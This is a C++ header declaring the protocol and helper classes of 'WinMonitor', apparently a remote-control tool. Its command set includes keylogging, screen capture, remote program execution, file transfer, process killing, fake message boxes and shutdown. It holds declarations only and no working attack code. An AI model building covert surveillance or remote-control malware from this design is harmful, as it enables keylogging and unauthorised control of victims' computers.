

#define MADE_NW_ERROR -1

enum NW_ERROR 
{	
	 NON_VALID_SOCKET=-1,
	 NO_ERR=0,
	 LISTEN_ERROR=1,
	 ACCEPT_ERROR=2,
	 CLIENT_OVERFLOW=3,
	 CLIENT_INVALID=4,
	 OTHER=5,
	 WINSOCK_DLL_LOAD_ERROR=6,
	 WINSOCK_DLL_RESET_ERROR=7,
	 WINSOCK_VERSION_NOT_FOUND=8,
	 SOCKET_BIND_ERROR=9,
	 THREAD_ERROR=10,
	 SERVER_INVALID=11,
	 CONNECTION_CLOSED=12,
	 CONNECTION_CLOSE_ERROR=13,
	 OPTION_BIND_ERROR=14
};

//-----------------WinMonitor Main Types------------------------//

#define WIN_MONITOR_NULL_COMMAND                   0x00
#define WIN_MONITOR_KEEP_ALIVE                     0x01
#define WIN_MONITOR_SHUTDOWN_CONNECTION            0x02
#define WIN_MONITOR_GET_PWD                        0x03
#define WIN_MONITOR_GOT_PWD                        0x04
#define WIN_MONITOR_PWD_OK                         0x05
#define WIN_MONITOR_COMMAND_MONITOR                0x06
#define WIN_MONITOR_SCREEN_MONITOR                 0x07

#define WIN_MONITOR_CHAT_CLIENTSERVER              0x08 
#define WIN_MONITOR_NORMAL_CLIENTSERVER            0x09 
#define WIN_MONITOR_CLIENT_ACCEPTED                0x0A
#define WIN_MONITOR_GET_CLIENTTYPE                 0x0B
#define WIN_MONITOR_KEYLOG_CLIENTSERVER            0x0C 

//----------------Command Monitor Client/Server----------------//

#define COMMAND_MONITOR_NULL_COMMAND          0x00000000
#define COMMAND_MONITOR_GET_LOGICAL_DRIVES    0x00000010
#define COMMAND_MONITOR_GET_SUB_DIRS          0x00000020
#define COMMAND_MONITOR_GET_DRIVE_TYPE        0x00000030
#define COMMAND_MONITOR_GET_DRIVE_INFO        0x00000040
#define COMMAND_MONITOR_GET_FILE_ASEXE        0x00000050
#define COMMAND_MONITOR_DOWNLOAD_FILE         0x00000060
#define COMMAND_MONITOR_DISPLAY_MSG           0x00000070
#define COMMAND_MONITOR_SET_COMPRESSION       0x00000080

#define COMMAND_MONITOR_GOT_LOGICAL_DRIVES    0x00000090
#define COMMAND_MONITOR_GOT_SUB_DIRS          0x000000A0
#define COMMAND_MONITOR_GOT_DRIVE_TYPE        0x000000B0
#define COMMAND_MONITOR_GOT_DRIVE_INFO        0x000000C0
#define COMMAND_MONITOR_GOT_FILE_ASEXE        0x000000D0
#define COMMAND_MONITOR_DOWNLOADED_FILE       0x000000E0
#define COMMAND_MONITOR_DISPLAYED_MSG         0x000000F0
#define COMMAND_MONITOR_SET_COMPRESSION_OK    0x00000100

//----------------Additional Commands-----------------//

#define COMMAND_MONITOR_GET_WINSERVER_NAME    0x00000110
#define COMMAND_MONITOR_GOT_WINSERVER_NAME    0x00000120
#define COMMAND_MONITOR_GET_MAIN_MEMORY       0x00000130
#define COMMAND_MONITOR_GOT_MAIN_MEMORY       0x00000140
#define COMMAND_MONITOR_GET_COMPUSER_NAME     0x00000150
#define COMMAND_MONITOR_GOT_COMPUSER_NAME     0x00000160
#define COMMAND_MONITOR_GET_OS_VERSION        0x00000170
#define COMMAND_MONITOR_GOT_OS_VERSION        0x00000180
#define COMMAND_MONITOR_GET_SUB_DIR_NAMES     0x00000190
#define COMMAND_MONITOR_GOT_SUB_DIR_NAMES     0x000001A0
#define COMMAND_MONITOR_GET_PROCESSLIST       0x000001B0
#define COMMAND_MONITOR_GOT_PROCESSLIST       0x000001C0

#define COMMAND_MONITOR_KILL_PROCESS          0x000001D0
#define COMMAND_MONITOR_KILLED_PROCESS        0x000001E0
#define COMMAND_MONITOR_EXEC_PROGRAM          0x000001F0
#define COMMAND_MONITOR_EXECD_PROGRAM         0x00000200
#define COMMAND_MONITOR_SET_PROC_PRIORITY     0x00000210
#define COMMAND_MONITOR_SET_PROC_PRIORITY_OK  0x00000220
#define COMMAND_MONITOR_LOGOFF                0x00000230
#define COMMAND_MONITOR_LOGOFF_OK             0x00000240
#define COMMAND_MONITOR_SHUTDOWN              0x00000250
#define COMMAND_MONITOR_SHUTDOWN_OK           0x00000260
#define COMMAND_MONITOR_POWER_OFF             0x00000270
#define COMMAND_MONITOR_POWER_OFF_OK          0x00000280
#define COMMAND_MONITOR_RESTART               0x00000290
#define COMMAND_MONITOR_RESTART_OK            0x000002A0
#define COMMAND_MONITOR_DELETE_FILE           0x000002B0
#define COMMAND_MONITOR_DELETE_FILE_OK        0x000002C0
#define COMMAND_MONITOR_CREATE_FOLDER         0x000002D0
#define COMMAND_MONITOR_CREATE_FOLDER_OK      0x000002E0
#define COMMAND_MONITOR_UPLOADED_FILE         0x000002F0
#define COMMAND_MONITOR_FILE_UPLOADED         0x00000300
#define COMMAND_MONITOR_LISTEN_PORT			  0x00000310	


#define COMMAND_MONITOR_INSTALL_KEYBOARD_FUN_PLUGIN       0x00000320
#define COMMAND_MONITOR_INSTALLED_KEYBOARD_FUN_PLUGIN     0x00000330
#define COMMAND_MONITOR_UNINSTALL_KEYBOARD_FUN_PLUGIN     0x00000340
#define COMMAND_MONITOR_UNINSTALLED_KEYBOARD_FUN_PLUGIN   0x00000350
#define COMMAND_MONITOR_OPEN_CDROM       0x00000360
#define COMMAND_MONITOR_OPENED_CDROM     0x00000370 
#define COMMAND_MONITOR_CLOSE_CDROM      0x00000380
#define COMMAND_MONITOR_CLOSED_CDROM     0x00000390

//---------------------------------------------------//

#define COMMAND_MONITOR_COMPRESS_NIL          0x00000000
#define COMMAND_MONITOR_COMPRESS_LZSS         0x00000001

#define COMMAND_MONITOR_GetType(uint32Header)                ((uint32Header) & 0xFFFFFFF0) 
#define COMMAND_MONITOR_GetCompression(uint32Header)         ((uint32Header) & 0x0000000F) 
#define COMMAND_MONITOR_SetType(Choice,uint32Header)          uint32Header=(((uint32Header) | 0xFFFFFFF0)& ((Choice) | 0x0000000F))  
#define COMMAND_MONITOR_SetCompression(Choice,uint32Header)   uint32Header=(((uint32Header) | 0x0000000F)& ((Choice) | 0xFFFFFFF0))  


#define COMMAND_MONITOR_MSG_INFO    0x01
#define COMMAND_MONITOR_MSG_STOP    0x02
#define COMMAND_MONITOR_MSG_QSTN    0x03
#define COMMAND_MONITOR_MSG_EXCL    0x04

#define COMMAND_MONITOR_DRIVE_UNKNOWN         0x00
#define COMMAND_MONITOR_DRIVE_NOROOT          0x01
#define COMMAND_MONITOR_DRIVE_REMOVABLE       0x02
#define COMMAND_MONITOR_DRIVE_FIXED			  0x03
#define COMMAND_MONITOR_DRIVE_CDROM           0x04
#define COMMAND_MONITOR_DRIVE_RAMDISK         0x05
#define COMMAND_MONITOR_DRIVE_REMOTE          0x06

#define COMMAND_MONITOR_EXE_UNKNOWN           0x00
#define COMMAND_MONITOR_EXE_32BIT_BINARY      0x01
#define COMMAND_MONITOR_EXE_64BIT_BINARY      0x02	
#define COMMAND_MONITOR_EXE_DOS_BINARY        0x03  
#define COMMAND_MONITOR_EXE_OS216_BINARY      0x04  
#define COMMAND_MONITOR_EXE_PIF_BINARY        0x05
#define COMMAND_MONITOR_EXE_POSIX_BINARY      0x06
#define COMMAND_MONITOR_EXE_WOW_BINARY        0x07

#define COMMAND_MONITOR_PROCESS_PRIORITY_NO_CHANGE           0x00
#define COMMAND_MONITOR_PROCESS_PRIORITY_ABOVE_NORMAL        0x01 
#define COMMAND_MONITOR_PROCESS_PRIORITY_BELOW_NORMAL        0x02 
#define COMMAND_MONITOR_PROCESS_PRIORITY_HIGH_PRIORITY       0x03
#define COMMAND_MONITOR_PROCESS_PRIORITY_IDLE_PRIORITY       0x04
#define COMMAND_MONITOR_PROCESS_PRIORITY_NORMAL_PRIORITY     0x05
#define COMMAND_MONITOR_PROCESS_PRIORITY_REALTIME_PRIORITY   0x06

#define COMMAND_MONITOR_SYSTEM_DOWN_NORMAL    0x00
#define COMMAND_MONITOR_SYSTEM_DOWN_IMMEDIATE 0x01


//-------------Screen Monitor Types & Comprn-------//

#define SCREEN_MONITOR_TYPE_UNDEF             0x00
#define SCREEN_MONITOR_TYPE_DIBITMAP          0x10
#define SCREEN_MONITOR_TYPE_DIBITMAPFILE      0x20

#define SCREEN_MONITOR_COMPRESS_NIL      0x00
#define SCREEN_MONITOR_COMPRESS_LZSS     0x01

//-------------Screen Monitor Messages-------//

#define SCREEN_MONITOR_TYPE_TAKE_DESKTOP      0x30
#define SCREEN_MONITOR_TYPE_TAKE_WINDOW       0x40
#define SCREEN_MONITOR_TYPE_SET_COMPRESSION   0x50

//-------------------------------------------//


#define SCREEN_MONITOR_GETCOMPRESSION(Byte)            ((Byte) & 0x0F)
#define SCREEN_MONITOR_GETTYPE(Byte)                   ((Byte) & 0xF0)
#define SCREEN_MONITOR_SETCOMPRESSION(Choice,Byte)     (((Byte)| 0x0F) & ((Choice)|0xF0) )
#define SCREEN_MONITOR_SETTYPE(Choice,Byte)            (((Byte)| 0xF0) & ((Choice) | 0x0F))


//----------------File Monitor----------------//

#define CFileMonitor_FILENAME_ONLY      1
#define CFileMonitor_FILENAME_AND_SIZE  2
#define CFileMonitor_FILEINFO_DETAILED  3

#define CFileMonitor_FILETYPE_UNDEF        0
#define CFileMonitor_FILETYPE_DIR          1
#define CFileMonitor_FILETYPE_NORMAL       2
#define CFileMonitor_FILETYPE_HIDDEN       3
#define CFileMonitor_FILETYPE_TEMP         4
#define CFileMonitor_FILETYPE_ARCHIVE      5
#define CFileMonitor_FILETYPE_ENCRYPT      6
#define CFileMonitor_FILETYPE_SYSTEM       7
#define CFileMonitor_FILETYPE_READONLY     8
#define CFileMonitor_FILETYPE_OFFLINE      9
#define CFileMonitor_FILETYPE_COMPRESSED   10

typedef unsigned char  BYTE;
typedef unsigned short UINT16;
typedef unsigned int   UINT32;


typedef struct _tagWinMonitorNetworkServiceHeader
{
	BYTE   m_bytMsgType;
	UINT32 m_uint32Length;
}
WinMonitorNetworkServiceHeader;


//---------------------Command Monitor Headers--------//

typedef struct _tagFakeMessage
{
	BYTE byt_MsgType;
	BYTE byt_TextLen;
	BYTE byt_Captionlen;
}
FakeMessageHeader;

typedef struct _tagFileUpLoadHeader
{
	UINT uint16PathLength;
}
FileUpLoadHeader;

typedef struct _tagCommandMonitorHeader
{
	UINT32 uint32TypeAndCompression;
	UINT32 uint32Length;
} 
CommandMonitorNetworkHeader;

//--------------------Screen Monitor------------------//


typedef struct _tagScreenMonitorNwHeader
{
	BYTE TypeAndCompression;
	UINT32 Length;
} 
ScreenMonitorNetworkeader;


//---------------------***********----------------//

#ifdef WINMONITORGENERICLIB_EXPORTS
	#define WINMONITORGENERICLIB_API __declspec(dllexport)
#else
	#define WINMONITORGENERICLIB_API __declspec(dllimport)
#endif


class WINMONITORGENERICLIB_API CGeneralMemoryUtility
{
	private:
		static HANDLE m_hPrivateHeap;

	public:
		static bool SetLocalHeap(HANDLE &HndToHeap);
		static HANDLE &GetLocalHeap(void);

   public:
		bool GetToken(TCHAR *Heirarchy,TCHAR *TokenSeperator,TCHAR **tchrToken,TCHAR **tchrSubHeirarchy);
		bool CreatePathFromRoot(TCHAR *Heirarchy);
		void DeleteAll(void **ArrayObject);
		void DeleteNew(void **ArrayObject);
		bool AllocateMem(void **TarObj,UINT32 NumberOfBytes);
		bool AllocateMem(TCHAR **TarObj,TCHAR *SrcObj);
		bool AllocateMem(TCHAR **TarObj,TCHAR *SrcObj,UINT32 NumOfChrsToCopy,bool IsAllocate=true);
		bool ReplaceChar(TCHAR *TarString,UINT32 NumOfCharsToConsider,TCHAR CharToReplace,TCHAR NewChar);
		bool CopyBytes(BYTE *Dst,BYTE *Src,UINT32 BytesToCopy);
		bool CopyBytes(BYTE **Dst,BYTE *Src,UINT32 BytesToCopy);
		bool AllocateNew(TCHAR **TarObj,TCHAR *SrcObj,UINT32 NumChars=0);
		void *ReAllocateMemory(void *MemoryBlock,size_t size_tNewSize);
		bool ReAllocateString(TCHAR **StringToReallocate,TCHAR *StringToAppend);
		bool SplitToPathAndFileName(TCHAR *FullFileName,TCHAR **Path,TCHAR **FileName);
		int GetLastIndexOfFileSlash(TCHAR *FullFileName);
};


//--------------Queue

//--------------Queue element

class  WINMONITORGENERICLIB_API CGenericQueueNode
{
	protected:
			void *m_ItemPtr;
			CGenericQueueNode *m_qnodeNextQnode;
	public:
			CGenericQueueNode(void);
			CGenericQueueNode(void *ptrToItemCopy);
			CGenericQueueNode(void *ptrToItemCopy,CGenericQueueNode *NextQnodePtr);
			~CGenericQueueNode() {};
	public:
			CGenericQueueNode *GetNextItem(void);
			bool SetNextItem(CGenericQueueNode *NextQnodePtr);
			void *GetItem(void);
			bool SetItem(void *ItemPtr);
};

//--------------Queue 

class  WINMONITORGENERICLIB_API CGenericQueue
{
	protected:
			HANDLE m_MuxQueue;
			CGenericQueueNode *m_qnodeHeadQnode,*m_qnodeTailQnode;
	public:
			CGenericQueue(void);
			~CGenericQueue();
			bool ClearList(void);
			bool InsertAtBack(void *ItemPtr);
			bool InsertAtFront(void *ItemPtr);
			bool DeleteFromBack(void **ItemDblPtr);
			bool DeleteFromFront(void **ItemDblPtr);
			bool FirstItem(void **ItemDblPtr);
			bool IsEmptyList(void);
};

//-------------generic linked list

class WINMONITORGENERICLIB_API CExtendedLinkedList:public CGenericQueue
{
	 protected:
			CGenericQueueNode *ParentNodeByAddress(UINT64  Address);
	 public:
			CExtendedLinkedList(void);
			~CExtendedLinkedList();
			bool DeleteItemByAddress(UINT64  Address);
			void *GetItemByAddress(UINT64  Address);
};

//----------------------N/w

class WINMONITORGENERICLIB_API INetworkByteStream
{
	public:
		virtual UINT32    WriteToNetworkByteStream(BYTE* &OutByteStream)=0;
		virtual UINT32    ReadFromNetworkByteStream(BYTE *InByteStream)=0;
		virtual HRESULT   CleanUp(void)=0;
		virtual HRESULT   ManageInterface(INetworkByteStream **ClientInterfaceDblPtr)=0;
};


class WINMONITORGENERICLIB_API CInitializeNetworkLibrary
{
protected:
	 static const int m_statconstintWinSockVersion;
	 static enum NW_ERROR m_statenumErrCode;
	 static bool SetError(enum NW_ERROR ErrCode){ m_statenumErrCode=ErrCode;return false; } 

public:
	 static enum NW_ERROR LastError(void) {  return m_statenumErrCode; }
	 static bool LoadLibraryAndVersion(void);
	 static bool CleanUpLibrary(void);
};


class WINMONITORGENERICLIB_API CNetworkBase
{
   protected:
		bool   FlushAll(SOCKET Socket);
	
	public:
		TCHAR *GetHostIP(const char *addr);
};


class WINMONITORGENERICLIB_API CTcpNwMonitorConnection:public CNetworkBase 
{
protected:
	 SOCKET m_socketDataSocket;
	 struct sockaddr_in m_sokadrinetRemoteAddr;
	 enum NW_ERROR m_enumErrCode;
	 bool m_boolErrorFlag;
	 HANDLE m_muxConnection;

protected:
	 void ReFresh(void);
	 bool SetError(enum NW_ERROR ErrCode); 
	 void ClearError(void)  { m_enumErrCode=NO_ERR;m_boolErrorFlag=0;  }
	 bool Connect(void);
	 bool SetUnBlocking(void);

public:
	 CTcpNwMonitorConnection();
	 CTcpNwMonitorConnection(SOCKET *m_socketDataSocket,struct sockaddr_in *m_sokadrinetRemoteAddr);
	 CTcpNwMonitorConnection(CTcpNwMonitorConnection &ClientToBeCloned);	
	 ~CTcpNwMonitorConnection();
	 CTcpNwMonitorConnection &operator=(CTcpNwMonitorConnection &ClientToBeCloned);
	 void SetSocket(SOCKET SocketCopy) { m_socketDataSocket=SocketCopy; ClearError(); }
	 void SetAddress(struct sockaddr_in SockAddress) { m_sokadrinetRemoteAddr=SockAddress; ClearError(); }
	 bool FlushAll(void);	
	 enum NW_ERROR LastError(void) {  return m_enumErrCode; }
	 bool ConnectTo(TCHAR *ServerIP,UINT ServerPort);
	 bool GetIPandPort(bool OfRemoteHost,TCHAR *IP,UINT32 &Port);
	 bool IsEmptyReceiveBuffer(bool &blnIsSockError);
	 bool SendByteStream(char *MessageBuffer,UINT32 NumberOfBytesToSend,UINT32 &NumberOfBytesSended);
	 bool ReceiveByteStream(char *MessageBuffer,UINT32 NumberOfBytesToReceive,UINT32 &NumberOfBytesReceived);
	 bool Disconnect(void);
	 bool Invalidate(void);
};


class WINMONITORGENERICLIB_API CNetworkBasicUtility
{
	
   protected:
		HANDLE m_MuxNetworkBasicUtility;
		CTcpNwMonitorConnection m_TcpConnection; 

   protected:
    	bool SendAbnormalMessage(BYTE CmdType);
		bool FlushAll(void);
		bool CreateNetworkMutex(void);

	public:
		CNetworkBasicUtility(CTcpNwMonitorConnection TcpConnection);
		CNetworkBasicUtility(void);
	   ~CNetworkBasicUtility(void);
		bool SendShutDownMessage(void);
		bool SendNullCommand(void);
		bool WaitForMux(void);
		bool GiveUpMux(void);
		CTcpNwMonitorConnection GetConnection(void);
};

class WINMONITORGENERICLIB_API CTcpNwMonitorListener
{
protected:
	 static const LPCSTR m_strLOCAL_HOST;
	 	 
protected:
	 volatile bool m_boolListenFlag;
	 bool m_boolErrorFlag;
	 enum NW_ERROR m_enumErrCode;
	 	 	 	 
	 struct sockaddr_in m_sokadrinetListenAddress;
	 SOCKET m_socketTcpSocket;

	 CExtendedLinkedList *m_xtndlnkdlstptrConnectionSockQueue;
	 
	 HANDLE m_handletoAcceptClientThread;   
	 HANDLE m_muxListener;

protected:
	 bool Initialize(UINT uintIP,UINT Port=0);
	 bool SetError(enum NW_ERROR ErrCode); 
	 void ClearError(void)  { m_enumErrCode=NO_ERR; m_boolErrorFlag=0;  }  
	 bool ReFresh(void);
	 void Reset(void);
	 bool ExtractClient(CTcpNwMonitorConnection &Client,int How);

public:
	 bool RegisterClient(CTcpNwMonitorConnection Client);
	 SOCKET GetListenerSocket(void);
	 ~CTcpNwMonitorListener();

public:

   CTcpNwMonitorListener(bool LocalHost,UINT Port=0);
	 CTcpNwMonitorListener(LPCSTR IpAddress,UINT Port=0);
	 CTcpNwMonitorListener(void);
	 
	 bool ListenAt(bool LocalHost,UINT Port=0);
	 bool ListenAt(LPCSTR IpAddress,UINT Port=0);

	 enum NW_ERROR LastError(void) {  return m_enumErrCode; }
	 bool SetListenState(bool On=true);
	 bool RetrieveClient(CTcpNwMonitorConnection &Client);
	 bool RemoveClient(CTcpNwMonitorConnection &Client);
	 bool GetListenFlag(void) {	return m_boolListenFlag; } 
	 bool DisconnectListenConnection(void);
};

//-----------------------------------Lzss

#define N       4096    /* buffer size */
#define F       60  /* lookahead buffer size */
#define THRESHOLD   2
#define NIL     N   /* leaf of tree */
#define N_CHAR      (256 - THRESHOLD + F)
                /* kinds of characters (character code = 0..N_CHAR-1) */
#define T       (N_CHAR * 2 - 1)    /* size of table */
#define R       (T - 1)         /* position of root */
#define MAX_FREQ    0x8000      /* updates tree when the */

class WINMONITORGENERICLIB_API CLzhCompress:public CGeneralMemoryUtility  
{
private:
	
	unsigned long int  textsize, codesize;

	// LZSS compression

	BYTE text_buf[N + F - 1];
	short match_position, match_length, lson[N + 1], rson[N + 257], dad[N + 1];

	// Huffman coding

	WORD freq[T + 1];	/* frequency table */
	short prnt[T + N_CHAR];	/* pointers to parent nodes, except for the */
							/* elements [T..T + N_CHAR - 1] which are used to get */
							/* the positions of leaves corresponding to the codes. */
	short son[T];				/* pointers to child nodes (son[], son[] + 1) */

	WORD getbuf;
	BYTE getlen;
	
	WORD putbuf;
	BYTE putlen;

	WORD code, len;


	// Various read/write things
	HANDLE hFileIn, hFileOut;
	BYTE *pMemIn, **ppMemOut;
	int nMemInSize, nMemRealAlloc, *pnMemOutSize;
	int nMemInOff, nMemOutOff;
	int freeze_type;

protected:

	void InitTree(void);				// initialize trees 
	void InsertNode(short r);			// insert to tree 
	void DeleteNode(short p);			// remove from tree 
	WORD GetBit(void);				// get one bit 
	WORD GetByte(void);				// get one byte 
	void Putcode(short l, WORD c); // output c bits of code 
	void StartHuff(void);
	void reconst(void);
	void update(short c);
	void EncodeChar(WORD c);
	void EncodePosition(WORD c);
	void EncodeEnd(void);
	short DecodeChar(void);
	short DecodePosition(void);
	void Encode(void);				// compression
	void Decode(void);				// recover 

	int fnc_read_file(BYTE *pBuffer, int nLen);
	int fnc_write_file(BYTE *pBuffer, int nLen);
	int fnc_read_memory(BYTE *pBuffer, int nLen);
	int fnc_write_memory(BYTE *pBuffer, int nLen);
	int fnc_write(BYTE *ptr, int len);
	int fnc_read(BYTE *ptr, int len);

	int fnc_getc(void);
	int fnc_putc(int val);
	int lzh_freeze(void);
	
public:
	int lzh_freeze_file(const char *szInFile, const char *szOutFile);
	int lzh_freeze_memory(void *pInBuffer, int nInBufLen, void **ppOutBuf, int *pnOutBufLen);
	int lzh_melt_file(const char *szInFile, const char *szOutFile);
	int lzh_melt_memory(void *pInBuffer, int nInBufLen, void **ppOutBuf, int *pnOutBufLen);
	int	lzh_free_memory(void **ppOutBuf);
};